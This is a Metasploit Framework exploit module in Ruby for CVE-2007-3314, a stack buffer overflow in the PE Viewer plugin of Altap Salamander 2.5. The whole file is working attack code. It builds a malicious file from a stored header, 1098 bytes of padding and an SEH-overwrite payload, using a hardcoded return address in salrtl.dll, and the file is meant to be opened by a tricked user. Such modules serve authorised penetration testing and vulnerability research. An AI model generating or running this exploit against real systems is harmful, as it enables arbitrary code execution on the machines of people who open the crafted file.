##
# $Id: altap_salamander_pdb.rb 11353 2010-12-16 20:11:01Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Altap Salamander 2.5 PE Viewer Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Altap Salamander <= v2.5.
					By creating a malicious file and convincing a user to view the file with
					the Portable Executable Viewer plugin within a vulnerable version of
					Salamander, the PDB file string is copied onto the stack and the
					SEH can be overwritten.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'patrick' ],
			'Version'        => '$Revision: 11353 $',
			'References'     =>
				[
					[ 'CVE', '2007-3314' ],
					[ 'BID', '24557' ],
					[ 'OSVDB', '37579' ],
					[ 'URL', 'http://vuln.sg/salamander25-en.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0d\x0a=:\\/%$^&*",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Universal Salamander 2.5', { 'Ret' => 0x23920b59 } ], # pop ebx; pop eax; ret salrtl.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 19 2007',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ false, 'The file name.',  'msf-salamander-pdb.exe'])
				], self.class)

	end

	def exploit

		seh = generate_seh_payload(target.ret)

		# load the static pdb file beginning
		path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2007-3314.dat")
		fd = File.open(path, "rb")
		sploit = fd.read(fd.stat.size)
		fd.close

		sploit << rand_text_alphanumeric(1098) + seh
		sploit << ".pdb"

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end